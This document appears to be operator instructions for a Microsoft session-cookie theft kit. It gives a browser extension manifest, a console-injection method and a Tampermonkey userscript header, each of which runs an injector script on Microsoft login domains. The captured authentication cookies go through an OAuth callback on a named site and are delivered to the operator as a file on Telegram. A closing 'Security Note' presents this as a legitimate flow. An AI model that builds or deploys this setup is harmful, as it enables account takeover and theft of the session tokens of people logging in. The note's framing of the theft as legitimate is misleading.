# Microsoft Cookie Capture Instructions

## Method 1: Browser Extension Injection (Recommended)

### Step 1: Create a Simple Browser Extension

1. **Create a new folder** called `microsoft-cookie-capturer`

2. **Create `manifest.json`:**
```json
{
  "manifest_version": 3,
  "name": "Microsoft Cookie Capturer",
  "version": "1.0",
  "description": "Captures Microsoft login cookies",
  "permissions": [
    "activeTab",
    "scripting"
  ],
  "host_permissions": [
    "*://login.microsoftonline.com/*",
    "*://login.live.com/*",
    "*://account.microsoft.com/*",
    "*://login.microsoft.com/*"
  ],
  "content_scripts": [
    {
      "matches": [
        "*://login.microsoftonline.com/*",
        "*://login.live.com/*",
        "*://account.microsoft.com/*",
        "*://login.microsoft.com/*"
      ],
      "js": ["injector.js"],
      "run_at": "document_start"
    }
  ]
}
```

3. **Copy the injector script:**
   - Copy the content from `src/utils/microsoft-cookie-injector.js`
   - Save it as `injector.js` in the extension folder

4. **Load the extension:**
   - Open Chrome → Extensions → Developer mode → Load unpacked
   - Select the `microsoft-cookie-capturer` folder

### Step 2: Use the System

1. **Open your OAuth site** (https://vaultydocs.com)
2. **Click login** - this will redirect to Microsoft
3. **The extension automatically captures cookies** from Microsoft domains
4. **Complete the login** - cookies are sent to your OAuth callback
5. **Check Telegram** for the file with real Microsoft cookies

---

## Method 2: Manual Browser Console Injection

### Step 1: Open Microsoft Login Page

1. Go to https://login.microsoftonline.com
2. Open Developer Tools (F12)
3. Go to Console tab

### Step 2: Inject the Script

1. **Copy the entire script** from `src/utils/microsoft-cookie-injector.js`
2. **Paste it in the console** and press Enter
3. **You should see:** `🎯 Microsoft Cookie Injector loaded and ready`

### Step 3: Complete Login Process

1. **Enter your credentials** and login
2. **The script automatically captures cookies** during the process
3. **Check console logs** for confirmation

---

## Method 3: Tampermonkey/Greasemonkey Script

### Step 1: Install Tampermonkey

- Chrome: Install from Chrome Web Store
- Firefox: Install Tampermonkey/Greasemonkey

### Step 2: Create Script

1. **Click Tampermonkey icon** → Create new script
2. **Replace the content** with:

```javascript
// ==UserScript==
// @name         Microsoft Cookie Capturer
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Capture Microsoft login cookies
// @author       You
// @match        *://login.microsoftonline.com/*
// @match        *://login.live.com/*
// @match        *://account.microsoft.com/*
// @match        *://login.microsoft.com/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

// [PASTE THE ENTIRE CONTENT OF microsoft-cookie-injector.js HERE]
```

3. **Save the script** (Ctrl+S)

### Step 3: Use the System

The script will now automatically run on Microsoft login pages.

---

## How It Works

1. **Script injection** happens on Microsoft domains
2. **Real cookies are captured** from `login.microsoftonline.com`
3. **Cookies are sent** via `postMessage` to your OAuth callback
4. **Your system receives** actual Microsoft authentication cookies
5. **Cookies are included** in the Telegram file

## Expected Results

✅ **Real Microsoft cookies** (not localStorage data)  
✅ **Authentication session cookies**  
✅ **Login state cookies**  
✅ **Security tokens and identifiers**

## Security Note

This captures cookies from Microsoft's domain during the legitimate OAuth flow. The cookies are only accessible during the user's own login session.